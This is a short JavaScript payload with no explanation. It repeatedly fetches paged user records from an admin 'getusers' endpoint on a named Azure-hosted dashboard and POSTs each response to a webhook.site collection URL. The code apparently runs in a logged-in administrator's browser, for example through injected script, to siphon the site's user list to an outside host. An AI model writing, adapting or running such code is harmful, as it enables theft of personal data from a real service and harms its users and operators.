
 var breaker = false; 

function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }
}

for ( var i = 0; i < 307; i++) {
  
     sleep(1000);
  
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    
     var http = new XMLHttpRequest();
    
  if (xhr.readyState == 4) {

          var url = "https://webhook.site/4099baf3-cc56-48fa-ae2f-90bfb5f74dbc/"+i;
          http.open("POST", url, false);
          http.setRequestHeader("Content-type", "text/plain");
    			
    			if(xhr.responseText.length > 120)        
          {
  
         http.send(xhr.responseText);
          }
    else 
    {
         breaker = true;  
    }
    

            } //if ==4
        
}; //ready xhr
xhr.open('GET', "https://haatadmindashboard.azurewebsites.net/admin/getusers?sort=true&draw=1&AreaId=0&start="+i*50+"&length=100", false);
xhr.send(null); 
  
  if(breaker == true)
    break;
  
} //for

